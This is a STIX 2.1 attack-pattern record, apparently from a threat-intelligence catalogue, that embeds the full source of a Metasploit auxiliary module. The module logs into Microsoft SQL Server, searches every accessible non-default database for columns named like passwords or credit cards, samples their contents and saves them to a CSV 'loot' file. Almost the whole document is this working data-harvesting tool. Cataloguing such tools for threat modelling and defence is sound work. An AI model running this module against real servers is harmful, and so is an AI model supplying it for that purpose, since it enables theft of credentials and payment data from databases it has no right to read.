{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7a4ab612-3eba-4a46-9341-83536705a2ac",
    "created": "2024-08-14T16:22:29.902876Z",
    "modified": "2024-08-14T16:22:29.90288Z",
    "name": "Microsoft SQL Server Find and Sample Data",
    "description": "This script will search through all of the non-default databases on the SQL Server for columns that match the keywords defined in the TSQL KEYWORDS option. If column names are found that match the defined keywords and data is present in the associated tables, the script will select a sample of the records from each of the affected tables.  The sample size is determined by the SAMPLE_SIZE option, and results output in a CSV format. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/mssql/mssql_findandsampledata.rb",
            "external_id": "mssql_findandsampledata.rb"
        },
        {
            "source_name": "References=>URL",
            "external_id": "http://www.netspi.com/blog/author/ssutherland/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::MSSQL\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Microsoft SQL Server Find and Sample Data',\n      'Description'    => %q{This script will search through all of the non-default databases\n      on the SQL Server for columns that match the keywords defined in the TSQL KEYWORDS\n      option. If column names are found that match the defined keywords and data is present\n      in the associated tables, the script will select a sample of the records from each of\n      the affected tables.  The sample size is determined by the SAMPLE_SIZE option, and results\n      output in a CSV format.\n      },\n      'Author'         => [\n        'Scott Sutherland <scott.sutherland[at]netspi.com>', # Metasploit module\n        'Robin Wood <robin[at]digininja.org>',               # IDF module which was my inspiration\n        'humble-desser <humble.desser[at]gmail.com>',         # Help on IRC\n        'Carlos Perez <carlos_perez[at]darkoperator.com>',   # Help on IRC\n        'hdm',                                               # Help on IRC\n        'todb'                                               # Help on GitHub\n      ],\n      'License'        => MSF_LICENSE,\n      'References'     => [[ 'URL', 'http://www.netspi.com/blog/author/ssutherland/' ]]\n    ))\n\n    register_options(\n      [\n        OptString.new('KEYWORDS', [ true, 'Keywords to search for','passw|credit|card']),\n        OptInt.new('SAMPLE_SIZE', [ true, 'Number of rows to sample',  1]),\n      ])\n  end\n\n  def print_with_underline(str)\n    print_line(str)\n    print_line(\"=\" * str.length)\n  end\n\n  def run_host(ip)\n    sql_statement()\n  end\n\n  def sql_statement()\n\n    # DEFINED HEADER TEXT\n    headings = [\n      [\"Server\",\"Database\", \"Schema\", \"Table\", \"Column\", \"Data Type\", \"Sample Data\",\"Row Count\"]\n    ]\n\n    # DEFINE SEARCH QUERY AS VARIABLE\n    sql = \"\n    -- CHECK IF VERSION IS COMPATABLE = > than 2000\n    IF (SELECT SUBSTRING(CAST(SERVERPROPERTY('ProductVersion') as VARCHAR), 1,\n    CHARINDEX('.',cast(SERVERPROPERTY('ProductVersion') as VARCHAR),1)-1)) > 0\n    BEGIN\n\n      -- TURN OFF ROW COUNT\n      SET NOCOUNT ON;\n      --------------------------------------------------\n      -- SETUP UP SAMPLE SIZE\n      --------------------------------------------------\n      DECLARE @SAMPLE_COUNT varchar(800);\n      SET @SAMPLE_COUNT = '#{datastore['SAMPLE_SIZE']}';\n\n      --------------------------------------------------\n      -- SETUP KEYWORDS TO SEARCH\n      --------------------------------------------------\n      DECLARE @KEYWORDS varchar(800);\n      SET @KEYWORDS = '#{datastore['KEYWORDS']}|';\n\n      --------------------------------------------------\n      --SETUP WHERE STATEMENT CONTAINING KEYWORDS\n      --------------------------------------------------\n      DECLARE @SEARCH_TERMS varchar(800);\n      SET @SEARCH_TERMS = ''; -- Leave this blank\n\n      -- START WHILE LOOP HERE -- BEGIN TO ITTERATE THROUGH KEYWORDS\n\n        WHILE LEN(@KEYWORDS) > 0\n          BEGIN\n            --SET VARIABLES UP FOR PARSING PROCESS\n            DECLARE @change int\n            DECLARE @keyword varchar(800)\n\n            --SET KEYWORD CHANGE TRACKER\n            SELECT @change = CHARINDEX('|',@KEYWORDS);\n\n            --PARSE KEYWORD\n            SELECT @keyword = SUBSTRING(@KEYWORDS,0,@change) ;\n\n            -- PROCESS KEYWORD AND GENERATE WHERE CLAUSE FOR IT\n            SELECT @SEARCH_TERMS = 'LOWER(COLUMN_NAME) like ''%'+@keyword+'%'' or '+@SEARCH_TERMS\n\n            -- REMOVE PROCESSED KEYWORD\n            SET @KEYWORDS = SUBSTRING(@KEYWORDS,@change+1,LEN(@KEYWORDS));\n\n          END\n        -- REMOVE UNEEDED\n        SELECT @SEARCH_TERMS = SUBSTRING(@SEARCH_TERMS,0,LEN(@SEARCH_TERMS)-2);\n\n      --------------------------------------------------\n      -- CREATE GLOBAL TEMP TABLES\n      --------------------------------------------------\n      USE master;\n\n      IF OBJECT_ID('tempdb..##mytable') IS NOT NULL DROP TABLE ##mytable;\n      IF OBJECT_ID('tempdb..##mytable') IS NULL\n      BEGIN\n        CREATE TABLE ##mytable (\n          server_name varchar(800),\n          database_name varchar(800),\n          table_schema varchar(800),\n          table_name varchar(800),\n          column_name varchar(800),\n          column_data_type varchar(800)\n        )\n      END\n\n      IF OBJECT_ID('tempdb..##mytable2') IS NOT NULL DROP TABLE ##mytable2;\n      IF OBJECT_ID('tempdb..##mytable2') IS NULL\n      BEGIN\n        CREATE TABLE ##mytable2 (\n          server_name varchar(800),\n          database_name varchar(800),\n          table_schema varchar(800),\n          table_name varchar(800),\n          column_name varchar(800),\n          column_data_type varchar(800),\n          column_value varchar(800),\n          column_data_row_count varchar(800)\n        )\n      END\n\n      --------------------------------------------------\n      -- CURSOR1\n      -- ENUMERATE COLUMNS FROM EACH DATABASE THAT\n      -- CONTAIN KEYWORD AND WRITE THEM TO A TEMP TABLE\n      --------------------------------------------------\n\n      -- SETUP SOME VARIABLES FOR THE MYCURSOR1\n      DECLARE @var1 varchar(800);\n      DECLARE @var2 varchar(800);\n\n      --------------------------------------------------------------------\n      -- CHECK IF ANY NON-DEFAULT DATABASE EXIST\n      --------------------------------------------------------------------\n      IF (SELECT count(*)\n      FROM master..sysdatabases\n      WHERE name NOT IN ('master','tempdb','model','msdb')\n      and HAS_DBACCESS(name) <> 0) <> 0\n      BEGIN\n        DECLARE MY_CURSOR1 CURSOR\n        FOR\n\n        SELECT name FROM master..sysdatabases\n        WHERE name NOT IN ('master','tempdb','model','msdb')\n        and HAS_DBACCESS(name) <> 0;\n\n        OPEN MY_CURSOR1\n        FETCH NEXT FROM MY_CURSOR1 INTO @var1\n        WHILE @@FETCH_STATUS = 0\n        BEGIN\n        ---------------------------------------------------\n        -- SEARCH FOR KEYWORDS/INSERT RESULTS INTO MYTABLE\n        ---------------------------------------------------\n        SET @var2 = '\n        INSERT INTO ##mytable\n        SELECT @@SERVERNAME as SERVER_NAME,\n        TABLE_CATALOG as DATABASE_NAME,\n        TABLE_SCHEMA,\n        TABLE_NAME,\n        COLUMN_NAME,\n        DATA_TYPE\n        FROM ['+@var1+'].[INFORMATION_SCHEMA].[COLUMNS] WHERE '\n\n        --APPEND KEYWORDS TO QUERY\n        DECLARE @fullquery varchar(800);\n        SET @fullquery = @var2+@SEARCH_TERMS;\n\n        EXEC(@fullquery);\n        FETCH NEXT FROM MY_CURSOR1 INTO @var1\n\n        END\n        CLOSE MY_CURSOR1\n        DEALLOCATE MY_CURSOR1\n        -------------------------------------------------\n        -- CURSOR2\n        -- TAKE A X RECORD SAMPLE FROM EACH OF THE COLUMNS\n        -- THAT MATCH THE DEFINED KEYWORDS\n        -- NOTE: THIS WILL NOT SAMPLE EMPTY TABLES\n        -------------------------------------------------\n\n        IF (SELECT COUNT(*) FROM ##mytable) < 1\n          BEGIN\n            SELECT 'No columns where found that match the defined keywords.' as Message;\n          END\n        ELSE\n          BEGIN\n            DECLARE @var_server varchar(800)\n            DECLARE @var_database varchar(800)\n            DECLARE @var_table varchar(800)\n            DECLARE @var_table_schema varchar(800)\n            DECLARE @var_column_data_type varchar(800)\n            DECLARE @var_column varchar(800)\n            DECLARE @myquery varchar(800)\n            DECLARE @var_column_data_row_count varchar(800)\n\n            DECLARE MY_CURSOR2 CURSOR\n            FOR\n            SELECT server_name,database_name,table_schema,table_name,column_name,column_data_type\n            FROM ##mytable\n\n              OPEN MY_CURSOR2\n              FETCH NEXT FROM MY_CURSOR2 INTO @var_server,\n              @var_database,\n              @var_table_schema,\n              @var_table,\n              @var_column,\n              @var_column_data_type\n              WHILE @@FETCH_STATUS = 0\n              BEGIN\n              ----------------------------------------------------------------------\n              -- ADD AFFECTED SERVER/SCHEMA/TABLE/COLUMN/DATATYPE/SAMPLE DATA TO MYTABLE2\n              ----------------------------------------------------------------------\n              -- GET COUNT\n              DECLARE @mycount_query as varchar(800);\n              DECLARE @mycount as varchar(800);\n\n              -- CREATE TEMP TABLE TO GET THE COLUMN DATA ROW COUNT\n              IF OBJECT_ID('tempdb..#mycount') IS NOT NULL DROP TABLE #mycount\n              CREATE TABLE #mycount(mycount varchar(800));\n\n              -- SETUP AND EXECUTE THE COLUMN DATA ROW COUNT QUERY\n              SET @mycount_query = 'INSERT INTO #mycount SELECT DISTINCT\n                        COUNT('+@var_column+') FROM '+@var_database+'.\n                        '+@var_table_schema+'.'+@var_table;\n              EXEC(@mycount_query);\n\n              -- SET THE COLUMN DATA ROW COUNT\n              SELECT @mycount = mycount FROM #mycount;\n\n              -- REMOVE TEMP TABLE\n              IF OBJECT_ID('tempdb..#mycount') IS NOT NULL DROP TABLE #mycount\n\n              SET @myquery = '\n              INSERT INTO ##mytable2\n                    (server_name,\n                    database_name,\n                    table_schema,\n                    table_name,\n                    column_name,\n                    column_data_type,\n                    column_value,\n                    column_data_row_count)\n              SELECT TOP '+@SAMPLE_COUNT+' ('''+@var_server+''') as server_name,\n                    ('''+@var_database+''') as database_name,\n                    ('''+@var_table_schema+''') as table_schema,\n                    ('''+@var_table+''') as table_name,\n                    ('''+@var_column+''') as comlumn_name,\n                    ('''+@var_column_data_type+''') as column_data_type,\n                    '+@var_column+','+@mycount+' as column_data_row_count\n              FROM ['+@var_database+'].['+@var_table_schema++'].['+@var_table+']\n              WHERE '+@var_column+' IS NOT NULL;\n              '\n              EXEC(@myquery);\n\n              FETCH NEXT FROM MY_CURSOR2 INTO\n                    @var_server,\n                    @var_database,\n                    @var_table_schema,\n                    @var_table,@var_column,\n                    @var_column_data_type\n              END\n            CLOSE MY_CURSOR2\n            DEALLOCATE MY_CURSOR2\n\n            -----------------------------------\n            -- SELECT THE RESULTS OF THE SEARCH\n            -----------------------------------\n            IF (SELECT @SAMPLE_COUNT)= 1\n              BEGIN\n                SELECT DISTINCT cast(server_name as CHAR) as server_name,\n                cast(database_name as char) as database_name,\n                cast(table_schema as char) as table_schema,\n                cast(table_name as char) as table_schema,\n                cast(column_name as char) as column_name,\n                cast(column_data_type as char) as column_data_type,\n                cast(column_value as char) as column_data_sample,\n                cast(column_data_row_count as char) as column_data_row_count FROM ##mytable2\n              END\n            ELSE\n              BEGIN\n                SELECT DISTINCT cast(server_name as CHAR) as server_name,\n                cast(database_name as char) as database_name,\n                cast(table_schema as char) as table_schema,\n                cast(table_name as char) as table_schema,\n                cast(column_name as char) as column_name,\n                cast(column_data_type as char) as column_data_type,\n                cast(column_value as char) as column_data_sample,\n                cast(column_data_row_count as char) as column_data_row_count FROM ##mytable2\n              END\n          END\n      -----------------------------------\n      -- REMOVE GLOBAL TEMP TABLES\n      -----------------------------------\n      IF OBJECT_ID('tempdb..##mytable') IS NOT NULL DROP TABLE ##mytable;\n      IF OBJECT_ID('tempdb..##mytable2') IS NOT NULL DROP TABLE ##mytable2;\n\n      END\n      ELSE\n      BEGIN\n        ----------------------------------------------------------------------\n        -- RETURN ERROR MESSAGES IF THERE ARE NOT DATABASES TO ACCESS\n        ----------------------------------------------------------------------\n        IF (SELECT count(*) FROM master..sysdatabases\n        WHERE name NOT IN ('master','tempdb','model','msdb')) < 1\n          SELECT 'No non-default databases exist to search.' as Message;\n        ELSE\n          SELECT 'Non-default databases exist,\n          but the current user does not have\n          the privileges to access them.' as Message;\n        END\n    END\n    else\n    BEGIN\n      SELECT 'This module only works on SQL Server 2005 and above.';\n    END\n\n    SET NOCOUNT OFF;\"\n\n\n\n    # STATUSING\n    print_line(\" \")\n    print_status(\"Attempting to connect to the SQL Server at #{rhost}:#{rport}...\")\n\n    # CREATE DATABASE CONNECTION AND SUBMIT QUERY WITH ERROR HANDLING\n    begin\n      result = mssql_query(sql, false) if mssql_login_datastore\n      column_data = result[:rows]\n      print_good(\"Successfully connected to #{rhost}:#{rport}\")\n    rescue\n      print_error(\"Failed to connect to #{rhost}:#{rport}.\")\n    return\n    end\n\n    # CREATE TABLE TO STORE SQL SERVER DATA LOOT\n    sql_data_tbl = Rex::Text::Table.new(\n      'Header'  => 'SQL Server Data',\n      'Indent'   => 1,\n      'Columns' => ['Server', 'Database', 'Schema', 'Table', 'Column', 'Data Type', 'Sample Data', 'Row Count']\n    )\n\n    # STATUSING\n    print_status(\"Attempting to retrieve data ...\")\n\n    if (column_data.count < 7)\n      #Save loot status\n      save_loot=\"no\"\n\n      #Return error from SQL server\n      column_data.each { |row|\n        print_status(\"#{row.to_s.gsub(\"[\",\"\").gsub(\"]\",\"\").gsub(\"\\\"\",\"\")}\")\n      }\n    return\n    else\n      #SETUP COLUM WIDTH FOR QUERY RESULTS\n      #Save loot status\n      save_loot=\"yes\"\n      column_data.each { |row|\n        0.upto(7) { |col|\n          row[col] = row[col].strip.to_s\n          }\n      }\n      print_line(\" \")\n    end\n\n    # SETUP ROW WIDTHS\n    widths = [0, 0, 0, 0, 0, 0, 0, 0]\n    (column_data|headings).each { |row|\n      0.upto(7) { |col|\n        widths[col] = row[col].to_s.length if row[col].to_s.length > widths[col]\n      }\n    }\n\n    # PRINT HEADERS\n    buffer1 = \"\"\n    buffer2 = \"\"\n    headings.each { |row|\n      0.upto(7) { |col|\n        buffer1 += row[col].ljust(widths[col] + 1)\n        buffer2 += row[col]+ \",\"\n      }\n      print_line(buffer1)\n      buffer2 = buffer2.chomp(\",\")+ \"\\n\"\n    }\n\n    # PRINT DIVIDERS\n    buffer1 = \"\"\n    buffer2 = \"\"\n    headings.each { |row|\n      0.upto(7) { |col|\n        divider = \"=\" * widths[col] + \" \"\n        buffer1 += divider.ljust(widths[col] + 1)\n      }\n      print_line(buffer1)\n    }\n\n    # PRINT DATA\n    buffer1 = \"\"\n    buffer2 = \"\"\n    print_line(\"\")\n    column_data.each { |row|\n      0.upto(7) { |col|\n        buffer1 += row[col].ljust(widths[col] + 1)\n        buffer2 += row[col] + \",\"\n      }\n      print_line(buffer1)\n      buffer2 = buffer2.chomp(\",\")+ \"\\n\"\n\n      # WRITE QUERY OUTPUT TO TEMP REPORT TABLE\n      sql_data_tbl << [row[0], row[1], row[2], row[3], row[4], row[5], row[6], row[7]]\n\n      buffer1 = \"\"\n      buffer2 = \"\"\n      print_line(buffer1)\n    }\n    disconnect\n\n    this_service = nil\n    if framework.db and framework.db.active\n      this_service = report_service(\n        :host  => rhost,\n        :port => rport,\n        :name => 'mssql',\n        :proto => 'tcp'\n      )\n    end\n\n    # CONVERT TABLE TO CSV AND WRITE TO FILE\n    if (save_loot==\"yes\")\n      filename= \"#{datastore['RHOST']}-#{datastore['RPORT']}_sqlserver_query_results.csv\"\n      path = store_loot(\"mssql.data\", \"text/plain\", datastore['RHOST'], sql_data_tbl.to_csv, filename, \"SQL Server query results\",this_service)\n      print_good(\"Query results have been saved to: #{path}\")\n    end\n\n  end\nend\n"
}